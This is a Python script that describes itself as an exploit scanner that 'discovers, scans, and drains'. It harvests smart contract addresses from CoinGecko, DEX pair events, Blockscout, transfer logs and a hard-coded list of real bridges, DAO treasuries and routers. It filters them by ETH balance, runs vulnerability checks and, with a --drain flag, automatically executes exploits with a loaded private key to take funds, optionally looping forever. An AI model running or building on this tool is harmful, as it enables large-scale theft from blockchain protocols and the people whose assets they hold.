"""
Monster Multi-Layer Exploit Scanner — discovers, scans, and drains across all sources.

Architecture:
  Layer 1: CoinGecko API → token contracts
  Layer 2: DEX Factory events → LP pair contracts
  Layer 3: Blockscout recent → verified contracts
  Layer 4: Transfer events → active contracts receiving ETH
  Layer 5: DB contract_targets → accumulated addresses

Each layer → balance filter (>0.01) → EvmScanner (33 checks) → auto-drain (if gas)

Usage: python monster_scanner.py <chain> [--drain]
"""
import sys
import tomllib
import logging
import time
from decimal import Decimal
from typing import Optional
from src.rpc import RpcClient
from src.types import TokenInfo, PoolInfo, Chain, ContractTarget, ScanReport, Finding
from src.scanners.evm_scanner import EvmScanner
from src.data import DataCollector
from src.explorer import ExplorerClient
from src.verifiers.runner import VerifierRunner
from src.verifiers.honeypot import HoneypotVerifier
from src.verifiers.exploit_simulator import SimulatedExploitVerifier
from src.verifiers.multi_step import MultiStepVerifier
from src.exploit_executor import ExploitExecutor
from src.signer import load_evm_private_key, get_receive_address
from src.sources.blockscout import BlockscoutRecentSource, BLOCKSCOUT_URLS
from src.sources.uniswap_v2 import UniswapV2PairSource
from src.sources.mev_searcher import MevSearcherSource
from src.sources.nft_erc4337 import NftErc4337Source
from src.explorer import ExplorerClient

# ---------------------------------------------------------------------------
# Layer 5: Known high-value targets — bridges, proxies, multisigs, DAOs
# ---------------------------------------------------------------------------

KNOWN_TARGETS: dict[str, list[str]] = {
    "ethereum": [
        # Bridges (massive ETH)
        "0x8315177aB297bA92A06054cE80a67Ed4DBd7ed3a",  # Arbitrum Bridge
        "0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1",  # Polygon Bridge (ETH)
        "0x3154Cf16ccdb4C6d922629664174b904d80F2C35",  # Base Bridge
        "0x49048044D57e1C92A77f79988d21Fa8fAF74E97e",  # Optimism Bridge
        "0x32400084C286CF3E17e7B677ea9583e60a000324",  # zkSync Era Bridge
        # Multi-sig / Safe
        "0x1a7E4e63778B4f12a199C062f3eFdD288afCBce8",  # Euler hack recovery
        "0xBbA4C8eB57DF16c4CfAbe4e9A3Ab697A3e0C65D8",  # Maker Governance
        # DAO Treasuries
        "0xDa63E7038F38Bd7d0Da40808c5bcECd48Be18A42",  # Uniswap Timelock
        "0x0eF024d39Ef623a252FbA1DeD7a568AE370bF76b",  # Aave Treasury
        "0x10A19e7eE7d7F8a52822f6817de8ea18204F2e4f",  # 1inch Treasury
        # Known proxy contracts
        "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",  # Uniswap V2 Router
        "0xE592427A0AEce92De3Edee1F18E0157C05861564",  # Uniswap V3 Router
        "0xDef1C0ded9bec7F1a1670819833240f027b25EfF",  # 0x Exchange Proxy
        "0x1111111254fb6c44bAC0beD2854e76F90643097d",  # 1inch Router
        "0x881D40237659C251811CEC9c364ef91dC08D300C",  # MetaMask Swap Router
        # Token vesting / locks
        "0xC8C2B727d864dB1A4cF18D765d5Eae0b3f2E0c62",  # Uniswap Vesting
        "0x952c23f8F067A6D2294B8bC127BB02c9C1ccF8fB",  # Team Finance Lock
    ],
    "polygon": [
        "0xA0c68C638235ee32657e8f720a23ceC1bFc77C77",  # Polygon Bridge (ETH)
        "0x8484Ef722627bf18ca5Ae6BcF031c23E6e922B30",  # Polygon Bridge Token
        "0xE592427A0AEce92De3Edee1F18E0157C05861564",  # Uniswap V3 Router
        "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506",  # SushiSwap Router
        "0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff",  # QuickSwap Router
    ],
    "arbitrum": [
        "0x8315177aB297bA92A06054cE80a67Ed4DBd7ed3a",  # Arbitrum Bridge (L1 side)
        "0x0000000000000000000000000000000000000064",  # ArbSys precompile
        "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506",  # SushiSwap Router
        "0xE592427A0AEce92De3Edee1F18E0157C05861564",  # Uniswap V3 Router
        "0x960ea3e3C7FB317332d990873d354E18d7645590",  # GMX Router
    ],
    "base": [
        "0x3154Cf16ccdb4C6d922629664174b904d80F2C35",  # Base Bridge
        "0xE592427A0AEce92De3Edee1F18E0157C05861564",  # Uniswap V3 Router
        "0x327Df1E6de05895d2ab08513aaDD9313Fe505d86",  # Base Bridge L2
        "0x4200000000000000000000000000000000000010",  # Base L2ToL1Bridge
    ],
}

def fetch_known_targets(chain_key: str) -> list[ContractTarget]:
    """Layer 5: Known high-value targets from curated list."""
    chain = CHAIN_MAP.get(chain_key)
    if not chain:
        return []
    addrs = KNOWN_TARGETS.get(chain_key, [])
    targets = [ContractTarget(chain=chain, address=a.lower(), source="known_targets") for a in addrs]
    logger.info("Layer5 Known targets: %d", len(targets))
    return targets


# ---------------------------------------------------------------------------
# Layer 6: Additional DEX factories — SushiSwap, QuickSwap etc
# ---------------------------------------------------------------------------

SUSHISWAP_FACTORIES: dict[str, str] = {
    "ethereum": "0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac",
    "polygon": "0xc35DADB65012eC5796536bD9864eD8773aBc74C4",
    "arbitrum": "0xc35DADB65012eC5796536bD9864eD8773aBc74C4",
    "base": "0x71524B4f93c58fcbF659783284E38825f0622859",
}

PANCAKESWAP_FACTORIES: dict[str, str] = {
    "bsc": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73",
    "polygon": "0x02a84c1b3BBD7401a5f7fa98a384EBC70bB5749E",
    "ethereum": "0x1097053Fd2ea711dad45caCcc45EfF7548fCB362",
}


def fetch_dex_pairs(chain_key: str, rpc: RpcClient, factory_addr: str, source: str, max_pairs: int = 200) -> list[ContractTarget]:
    """Generic DEX pair fetcher via PairCreated events."""
    from eth_utils import keccak
    chain = CHAIN_MAP.get(chain_key)
    if not chain:
        return []

    topic = "0x" + keccak(b"PairCreated(address,address,address,uint256)").hex()
    targets: list[ContractTarget] = []

    try:
        current = rpc.get_block_number()
        from_b = max(0, current - 1000000)
        for start in range(from_b, current, 5000):
            if len(targets) >= max_pairs:
                break
            try:
                logs = rpc.get_logs(hex(start), hex(min(start + 4999, current)), factory_addr, [topic])
            except Exception:
                continue
            for log in logs:
                if len(targets) >= max_pairs:
                    break
                data = log.get("data", "")
                if len(data) >= 64:
                    pair_addr = "0x" + data[24:64]
                    if len(pair_addr) == 42:
                        targets.append(ContractTarget(chain=chain, address=pair_addr.lower(), source=source))
    except Exception as e:
        logger.warning("DEX %s error: %s", source, e)

    logger.info("Layer6 %s: %d pairs", source, len(targets))
    return targets

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(name)s] %(message)s")
logger = logging.getLogger("monster")

CHAIN_MAP: dict[str, Chain] = {c.name.lower(): c for c in Chain}
MIN_BALANCE = 0.01
SCAN_DELAY = 1.0  # seconds between contract scans

# ---------------------------------------------------------------------------
# Layer 1: CoinGecko token list
# ---------------------------------------------------------------------------

COINGECKO_CHAIN_IDS = {
    "ethereum": "ethereum",
    "polygon": "polygon-pos",
    "arbitrum": "arbitrum-one",
    "base": "base",
    "bsc": "binance-smart-chain",
    "avalanche": "avalanche",
    "optimism": "optimistic-ethereum",
    "zksync": "zksync-era",
}

def fetch_coingecko_tokens(chain_key: str, max_tokens: int = 500) -> list[ContractTarget]:
    """Layer 1: Fetch token list from CoinGecko public API."""
    import urllib.request, json
    cg_chain = COINGECKO_CHAIN_IDS.get(chain_key)
    if not cg_chain:
        logger.warning("CoinGecko: no mapping for %s", chain_key)
        return []

    targets: list[ContractTarget] = []
    chain = CHAIN_MAP.get(chain_key)
    if not chain:
        return []

    # Use the simple /coins/markets endpoint
    for page in range(1, 6):
        if len(targets) >= max_tokens:
            break
        try:
            url = f"https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&per_page=100&page={page}&sparkline=false"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=15) as resp:
                data = json.loads(resp.read())
            for coin in data:
                platforms = coin.get("platforms", {})
                addr = platforms.get(cg_chain, "")
                if addr and len(addr) > 30 and addr.startswith("0x"):
                    targets.append(ContractTarget(chain=chain, address=addr.lower(), source="coingecko"))
                    if len(targets) >= max_tokens:
                        break
            if len(data) < 100:
                break
            time.sleep(1.5)
        except Exception as e:
            logger.warning("CoinGecko page %d: %s", page, e)
            break

    logger.info("Layer1 CoinGecko: %d tokens", len(targets))
    return targets


# ---------------------------------------------------------------------------
# Layer 4: Transfer events — find contracts receiving ETH
# ---------------------------------------------------------------------------

TRANSFER_TOPIC = "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef"

def fetch_active_contracts(chain_key: str, rpc: RpcClient, max_contracts: int = 500) -> list[ContractTarget]:
    """Layer 4: Find contracts that received tokens/ETH via Transfer events."""
    chain = CHAIN_MAP.get(chain_key)
    if not chain:
        return []

    targets: list[ContractTarget] = []
    seen: set[str] = set()
    try:
        current = rpc.get_block_number()
        # Look back ~5000 blocks for recent Transfer events
        from_b = max(0, current - 5000)
        logs = rpc.get_logs(hex(from_b), hex(current), None, [TRANSFER_TOPIC])

        for log in logs:
            if len(targets) >= max_contracts:
                break
            # Transfer event: topics[1]=from, topics[2]=to
            topics = log.get("topics", [])
            for i in [1, 2]:
                if i < len(topics) and len(targets) < max_contracts:
                    addr = "0x" + topics[i][-40:]
                    if addr not in seen and len(addr) == 42:
                        # Check if it's a contract (has code)
                        try:
                            code = rpc.eth_get_code(addr)
                            if code and code != "0x" and len(code) > 4:
                                targets.append(ContractTarget(chain=chain, address=addr.lower(), source="transfer_event"))
                                seen.add(addr)
                        except Exception:
                            pass

        logger.info("Layer4 Transfer events: %d active contracts", len(targets))
    except Exception as e:
        logger.warning("Layer4 error: %s", e)

    return targets


# ---------------------------------------------------------------------------
# Core: balance-first scan + drain
# ---------------------------------------------------------------------------

def scan_and_drain(
    chain_key: str,
    rpc: RpcClient,
    targets: list[ContractTarget],
    drain: bool = False,
):
    """Filter by balance, scan, and optionally drain."""
    chain = CHAIN_MAP.get(chain_key)
    if not chain or not targets:
        return

    signer = load_evm_private_key()
    executor: Optional[ExploitExecutor] = None
    if drain and signer:
        executor = ExploitExecutor(signer=signer)

    explorer = ExplorerClient()
    data = DataCollector(rpc=rpc, explorer=explorer)
    verifier_runner = VerifierRunner(verifiers=[
        HoneypotVerifier(), SimulatedExploitVerifier(), MultiStepVerifier(),
    ])
    scanner = EvmScanner(data_collector=data, rpc=rpc, verifier_runner=verifier_runner, executor=executor)

    # Deduplicate addresses
    seen: set[str] = set()
    unique: list[str] = []
    for t in targets:
        addr = t.address.lower()
        if addr not in seen:
            seen.add(addr)
            unique.append(addr)
    logger.info("Scanning %d unique contracts (chain=%s, drain=%s)", len(unique), chain_key, drain)

    scanned = 0
    critical_hits: list[tuple[str, str, float, float]] = []  # (addr, check_name, confidence, balance)

    for i, addr in enumerate(unique):
        # Balance-first filter
        try:
            raw = rpc.call("eth_getBalance", [addr, "latest"])
            bal = int(str(raw), 16) / 1e18
        except Exception:
            continue

        if bal < MIN_BALANCE:
            continue

        logger.info("[%d/%d] %s: %.4f", i + 1, len(unique), addr[:12], bal)
        token = TokenInfo(address=addr, symbol=addr[:10], chain=chain)
        pool = PoolInfo(address="", dex="direct", liquidity_usd=Decimal("0"))

        try:
            report = scanner.scan(token, pool)
        except Exception as e:
            logger.error("  Scan error: %s", e)
            time.sleep(SCAN_DELAY)
            continue

        scanned += 1
        criticals = [f for f in report.findings if f.severity.name == "CRITICAL"]
        for f in criticals:
            critical_hits.append((addr, f.check_name, f.confidence or 0, bal))
            logger.warning("  >> CRITICAL: %s conf=%.2f eth=%.4f", f.check_name, f.confidence or 0, bal)

        time.sleep(SCAN_DELAY)

    # Save CRITICAL to file for later verification
    critical_file = f"critical_{chain_key}.txt"
    if critical_hits:
        with open(critical_file, "a") as f:
            for addr, check, conf, eth in critical_hits:
                f.write(f"{addr} {eth:.6f} {check} conf={conf:.2f}\n")
        logger.info("Saved %d CRITICAL to %s", len(critical_hits), critical_file)

    logger.info("DONE: scanned=%d critical=%d", scanned, len(critical_hits))
    return critical_hits


# ---------------------------------------------------------------------------
# Main — run all layers
# ---------------------------------------------------------------------------

def main():
    if len(sys.argv) < 2:
        print("Usage: python monster_scanner.py <chain> [--drain] [--loop]")
        return

    chain_key = sys.argv[1].lower()
    drain = "--drain" in sys.argv
    loop = "--loop" in sys.argv

    if chain_key not in CHAIN_MAP:
        print(f"Unknown chain: {chain_key}")
        return

    with open("config.toml", "rb") as f:
        config = tomllib.load(f)

    rpc_url = config["rpc"].get(chain_key, "")
    if not rpc_url:
        print(f"No RPC for {chain_key}")
        return

    rpc = RpcClient(rpc_url, max_retries=5)
    iteration = 1

    while True:
        logger.info("=" * 60)
        logger.info("MONSTER #%d — %s (drain=%s)", iteration, chain_key.upper(), drain)
        logger.info("=" * 60)

        chain_enum = CHAIN_MAP[chain_key]

        # ---- Layer 1: CoinGecko ----
        logger.info("--- Layer 1: CoinGecko ---")
        cg_targets = fetch_coingecko_tokens(chain_key, max_tokens=300)

        # ---- Layer 2: Uniswap V2 ----
        logger.info("--- Layer 2: Uniswap V2 ---")
        uni_source = UniswapV2PairSource(max_pairs=200)
        uni_targets = uni_source.fetch(chain_enum, rpc)

        # ---- Layer 3: Blockscout ----
        logger.info("--- Layer 3: Blockscout ---")
        bs_source = BlockscoutRecentSource(max_pages=3)
        bs_targets = bs_source.fetch(chain_enum)

        # ---- Layer 4: Transfer events ----
        logger.info("--- Layer 4: Transfer events ---")
        tx_targets = fetch_active_contracts(chain_key, rpc, max_contracts=200)

        # ---- Layer 5: Known targets ----
        logger.info("--- Layer 5: Known targets ---")
        known_targets = fetch_known_targets(chain_key)

        # ---- Layer 6: SushiSwap/PancakeSwap pairs ----
        logger.info("--- Layer 6: SushiSwap / PancakeSwap ---")
        sushi_targets: list[ContractTarget] = []
        if chain_key in SUSHISWAP_FACTORIES:
            sushi_targets = fetch_dex_pairs(chain_key, rpc, SUSHISWAP_FACTORIES[chain_key], "sushiswap", 200)
        pancake_targets: list[ContractTarget] = []
        if chain_key in PANCAKESWAP_FACTORIES:
            pancake_targets = fetch_dex_pairs(chain_key, rpc, PANCAKESWAP_FACTORIES[chain_key], "pancakeswap", 200)

        # ---- Layer 7: MEV Searcher contracts ----
        logger.info("--- Layer 7: MEV Searchers ---")
        mev_source = MevSearcherSource(max_results=100)
        mev_targets = mev_source.fetch(chain_enum, rpc)

        # ---- Layer 8: NFT Marketplaces + ERC-4337 ----
        logger.info("--- Layer 8: NFT / ERC-4337 ---")
        nft_source = NftErc4337Source()
        nft_targets = nft_source.fetch(chain_enum, rpc)

        # ---- Combine & scan ----
        all_targets = (cg_targets + uni_targets + bs_targets + tx_targets +
                       known_targets + sushi_targets + pancake_targets +
                       mev_targets + nft_targets)
        logger.info("Total: %d (CG=%d Uni=%d BS=%d TX=%d Known=%d Sushi=%d Cake=%d MEV=%d NFT=%d)",
                     len(all_targets), len(cg_targets), len(uni_targets), len(bs_targets),
                     len(tx_targets), len(known_targets), len(sushi_targets), len(pancake_targets),
                     len(mev_targets), len(nft_targets))

        if all_targets:
            scan_and_drain(chain_key, rpc, all_targets, drain=drain)

        if not loop:
            break

        logger.info("Sleeping 60s before next iteration...")
        time.sleep(60)
        iteration += 1


if __name__ == "__main__":
    main()
